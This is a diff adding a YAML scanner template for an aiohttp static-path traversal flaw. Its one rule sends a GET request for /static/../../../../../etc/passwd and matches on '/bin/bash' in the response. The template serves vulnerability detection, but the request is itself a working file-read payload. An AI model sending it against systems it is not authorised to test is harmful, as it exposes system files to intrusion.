@@ -1,0 +1,15 @@
+cve-id: aiohttp-fileread
+set:
+  boundary: 'randomLowercase(20)'
+  filename: 'randomLowercase(10)'
+rules:
+- method: GET
+  path: /static/../../../../../etc/passwd
+  headers:
+    Connection: close
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36
+      (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36
+    Accept-Encoding: gzip
+  expression: 'response.status == 200 && response.body.bcontains(b"/bin/bash") '
+severity: high
+type: fileread
